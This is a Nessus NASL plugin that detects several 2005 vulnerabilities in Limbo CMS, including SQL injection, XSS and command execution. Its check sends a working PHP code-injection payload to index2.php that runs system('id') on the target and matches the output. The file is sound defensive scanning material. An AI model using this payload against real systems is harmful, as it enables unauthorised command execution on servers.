#%NASL_MIN_LEVEL 70300
#
# This script was written by Josh Zlatin-Amishav <josh at ramat dot cc>
# GPLv2
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if(description)
{
 script_id(20824);
 script_version("1.15");
 script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

 script_cve_id("CVE-2005-4317", "CVE-2005-4318", "CVE-2005-4319", "CVE-2005-4320");
 script_bugtraq_id(15871);
 
 script_name(english:"Limbo CMS Multiple Vulnerabilities");
 script_summary(english:"Checks for multiple vulnerabilities in Limbo");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
numerous vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Limbo CMS, a content-management system
written in PHP. 

The remote version of this software is vulnerable to several flaws
including :

  - If register_globals is off and Limbo is configured to use 
    a MySQL backend, then a SQL injection is possible due to 
    improper sanitization of the '_SERVER[REMOTE_ADDR]' 
    parameter.

  - The installation path is revealed when the 'doc.inc.php', 
    'element.inc.php', and 'node.inc.php' files are reqeusted 
    when PHP's 'display_errors' setting is enabled.

  - A cross-site scripting attack is possible when the Stats 
    module is used due to improper sanitization of the 
    '_SERVER[REMOTE_ADDR]' parameter.

  - Arbitrary PHP files can be retrieved via the 
    'index2.php' script due to improper sanitation of the 
    'option' parameter.

  - An attacker can run arbitrary system commands on the 
    remote system via a combination of the SQL injection 
    and directory transversal attacks." );
 script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/419470" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6b3b5f19" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch from the references above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/01/30");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/12/14");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2006-2021 Josh Zlatin-Amishav");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80, embedded:TRUE);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


http_check_remote_code_ka(
  extra_dirs:"",
  check_request:string("/index2.php?_SERVER[]=&_SERVER[REMOTE_ADDR]='.system('id').exit().'&option=wrapper&module[module]=1"),
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port,
  xss: 1, sql_inject: 1
);
